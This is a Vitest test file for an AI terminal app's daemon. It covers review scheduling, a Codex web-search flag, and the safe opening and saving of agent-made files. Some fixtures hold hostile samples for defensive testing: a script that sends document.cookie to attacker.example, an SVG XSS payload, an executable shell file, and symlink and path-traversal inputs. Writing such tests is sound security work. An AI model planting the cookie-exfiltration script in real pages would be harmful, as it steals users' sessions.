import { afterEach, expect, it, vi } from 'vitest';
import { mkdir, mkdtemp, readFile, readdir, realpath, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import pty from 'node-pty';
import { dueStudies, recordStudy, STUDY_DAYS } from '../src/daemon/study.js';
import { buildArgs } from '../src/daemon/env.js';
import { getPaths, preparePaths } from '../src/shared/paths.js';
import * as engines from '../src/daemon/engines.js';
import { Logger } from '../src/daemon/log.js';
import { SessionManager } from '../src/daemon/session-manager.js';
import type { SessionInfo } from '../src/shared/protocol.js';

// v1.1 batch 3, the daemon's own parts: /study's review schedule, o and s for made files, and Codex's web search flag.
const run = promisify(execFile), roots: string[] = [], managers: SessionManager[] = [];
afterEach(async () => { for (const m of managers.splice(0)) await m.shutdown(); vi.restoreAllMocks(); SessionManager.fileOpener = null; SessionManager.downloads = null; for (const root of roots.splice(0)) await rm(root, { recursive: true, force: true }); });
async function temp(): Promise<string> { const dir = await realpath(await mkdtemp(join(tmpdir(), 'ai-batch3-d-'))); roots.push(dir); return dir; }

it('/study schedules a topic for tomorrow, then spaces its reviews out; due lists what is due by today', async () => {
  const root = await temp(), day = (n: number) => new Date(2026, 9, 18 + n, 12);
  expect(STUDY_DAYS).toEqual([1, 3, 7, 16, 35]);
  await recordStudy(root, 'Git worktrees', day(0));
  expect(await dueStudies(root, day(0))).toEqual([]);
  expect(await dueStudies(root, day(1))).toEqual([{ topic: 'Git worktrees', due: '2026-10-19', step: 0 }]);
  await recordStudy(root, 'git  worktrees', day(1));
  expect(await dueStudies(root, day(3))).toEqual([]);
  expect(await dueStudies(root, day(4))).toEqual([{ topic: 'Git worktrees', due: '2026-10-22', step: 1 }]);
  // A file someone else wrote there is refused, not trusted.
  await writeFile(join(root, 'study', 'schedule.json'), '{"not":"a list"}');
  await expect(dueStudies(root, day(0))).rejects.toThrow('The study schedule is unreadable');
});

it('Codex gets live web search only for an add-on that needs the web', () => {
  const base = { engine: 'codex' as const, model: null, permission: 'ask' as const };
  const bundle = join('/Users', 'x', '.ai-term', 'addons', 'a'.repeat(64));
  expect(buildArgs({ ...base, addon: { bundle, readOnly: false, web: true } })).toContain('--search');
  expect(buildArgs({ ...base, addon: { bundle, readOnly: false } })).not.toContain('--search');
  expect(buildArgs(base)).not.toContain('--search');
});

async function manager() {
  const dir = await temp(), repo = join(dir, 'repo'), home = join(dir, 'home'); await mkdir(repo); await mkdir(home, { mode: 0o700 });
  await run('/usr/bin/git', ['init', '-q', '-b', 'main', '--', repo]);
  await writeFile(join(repo, 'README.md'), '# r\n'); await run('/usr/bin/git', ['-c', 'user.name=T', '-c', 'user.email=t@e.invalid', '-c', 'commit.gpgsign=false', 'commit', '-qm', 'first', '--allow-empty'], { cwd: repo });
  const paths = getPaths(home); await preparePaths(paths);
  const real = pty.spawn;
  vi.spyOn(pty, 'spawn').mockImplementation((_file, _args, options) => real('/bin/sh', ['-c', 'sleep 30'], { ...options, env: { PATH: '/usr/bin:/bin' } }));
  vi.spyOn(engines, 'checkEngine').mockResolvedValue({ installed: true, path: '/bin/sh', version: '1', loggedIn: true, authMethod: 'subscription' });
  const m = new SessionManager(paths, new Logger(paths.log)); managers.push(m); await m.load();
  const agent = await m.create({ engine: 'codex', model: 'gpt-test', auth: { kind: 'account' }, cwd: repo, permission: 'ask', title: 'maker' });
  const live = (m as unknown as { sessions: Map<string, { info: SessionInfo }> }).sessions.get(agent.id);
  if (!live) throw new Error('no live'); live.info.status = 'done';
  return { dir, m, agent, tree: agent.worktree ?? '' };
}

it('o opens a made file with your default app; s copies it to Downloads without overwriting; links and other folders are refused', async () => {
  const { dir, m, agent, tree } = await manager(), downloads = join(dir, 'Downloads'), opened: string[] = [];
  await mkdir(downloads); SessionManager.downloads = downloads; SessionManager.fileOpener = async path => { opened.push(path); };
  await mkdir(join(tree, 'out', 'deck'), { recursive: true }); await writeFile(join(tree, 'out', 'deck', 'pitch.html'), '<h1>deck</h1>');
  expect(await m.addonFile(agent.id, 'out/deck/pitch.html', 'open')).toBeNull();
  // o opens AI Term's private copy of the checked bytes, never the agent's path (batch 3 review).
  expect(opened).toHaveLength(1); expect(opened[0]?.endsWith('/pitch.html')).toBe(true); expect(opened[0]).not.toContain(tree);
  expect(await m.addonFile(agent.id, 'out/deck/pitch.html', 'save')).toBe(join(downloads, 'pitch.html'));
  expect(await m.addonFile(agent.id, 'out/deck/pitch.html', 'save')).toBe(join(downloads, 'pitch (2).html'));
  expect((await readdir(downloads)).sort()).toEqual(['pitch (2).html', 'pitch.html']);
  expect(await readFile(join(downloads, 'pitch.html'), 'utf8')).toBe('<h1>deck</h1>');
  await writeFile(join(dir, 'private.txt'), 'secret'); await symlink(join(dir, 'private.txt'), join(tree, 'out', 'deck', 'link.html'));
  await expect(m.addonFile(agent.id, 'out/deck/link.html', 'save')).rejects.toThrow();
  await expect(m.addonFile(agent.id, '../outside.html', 'open')).rejects.toThrow();
  expect(opened).toHaveLength(1);
});

// ---- Batch 3 review findings (security HIGH/MEDIUM, TS MEDIUM-HIGH) ----
it('HIGH (both reviews): o and s take only a viewable file type, never an executable one or one with extra links, and o opens a private copy', async () => {
  const { dir, m, agent, tree } = await manager(), downloads = join(dir, 'Downloads'), opened: string[] = [];
  await mkdir(downloads); SessionManager.downloads = downloads; SessionManager.fileOpener = async path => { opened.push(path); };
  const deck = join(tree, 'out', 'deck'); await mkdir(deck, { recursive: true });
  const { chmod, link } = await import('node:fs/promises');
  await writeFile(join(deck, 'run.command'), '#!/bin/sh\ntouch pwned\n'); await chmod(join(deck, 'run.command'), 0o755);
  await expect(m.addonFile(agent.id, 'out/deck/run.command', 'open')).rejects.toThrow('not a file type AI Term opens');
  await writeFile(join(deck, 'x.html'), '<p>x</p>'); await chmod(join(deck, 'x.html'), 0o755);
  await expect(m.addonFile(agent.id, 'out/deck/x.html', 'open')).rejects.toThrow('executable');
  await writeFile(join(dir, 'private.md'), 'secret'); await link(join(dir, 'private.md'), join(deck, 'notes.md'));
  await expect(m.addonFile(agent.id, 'out/deck/notes.md', 'save')).rejects.toThrow('one link');
  await writeFile(join(deck, 'pitch.html'), '<h1>deck</h1>');
  await m.addonFile(agent.id, 'out/deck/pitch.html', 'open');
  // The opened file is AI Term's own private copy, not the agent's path: a swap after the check changes nothing.
  expect(opened).toHaveLength(1); expect(opened[0]).not.toContain(tree); expect(opened[0]?.endsWith('.html')).toBe(true);
  expect(await readFile(opened[0] ?? '', 'utf8')).toBe('<h1>deck</h1>');
  SessionManager.downloads = join(dir, 'no-such-folder');
  await expect(m.addonFile(agent.id, 'out/deck/pitch.html', 'save')).rejects.toThrow('No Downloads folder');
});

it('MEDIUM (v1.0 gate): o opens model-written HTML and SVG with no script able to run, s saves HTML the same way; nothing opens while the agent runs', async () => {
  const { dir, m, agent, tree } = await manager(), downloads = join(dir, 'Downloads'), opened: string[] = [];
  await mkdir(downloads); SessionManager.downloads = downloads; SessionManager.fileOpener = async path => { opened.push(path); };
  await mkdir(join(tree, 'out', 'deck'), { recursive: true }); await mkdir(join(tree, 'docs', 'diagrams'), { recursive: true });
  await writeFile(join(tree, 'out', 'deck', 'x.html'), '<!doctype html><html><head><script>fetch("https://attacker.example/?"+document.cookie)</script></head><body>deck</body></html>');
  await writeFile(join(tree, 'docs', 'diagrams', 'd.svg'), '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  await m.addonFile(agent.id, 'out/deck/x.html', 'open');
  const html = await readFile(opened[0] ?? '', 'utf8');
  expect(html.indexOf('Content-Security-Policy')).toBeGreaterThan(-1);
  expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<script>'));
  expect(html).toContain("default-src 'none'");
  await m.addonFile(agent.id, 'docs/diagrams/d.svg', 'open');
  // An SVG opens inside a page that shows it as an image, where SVG scripts never run.
  expect(opened[1]?.endsWith('.html')).toBe(true);
  const page = await readFile(opened[1] ?? '', 'utf8');
  expect(page).toContain('<img src="d.svg"'); expect(page).toContain("default-src 'none'");
  const saved = await m.addonFile(agent.id, 'out/deck/x.html', 'save');
  expect(await readFile(saved ?? '', 'utf8')).toContain("default-src 'none'");
  // While the agent still runs it could swap its folder for a link between the check and the open (LOW): wait for it.
  const live = (m as unknown as { sessions: Map<string, { info: SessionInfo }> }).sessions.get(agent.id);
  if (live) live.info.status = 'running';
  await expect(m.addonFile(agent.id, 'out/deck/x.html', 'open')).rejects.toThrow('Wait until the agent finishes');
});
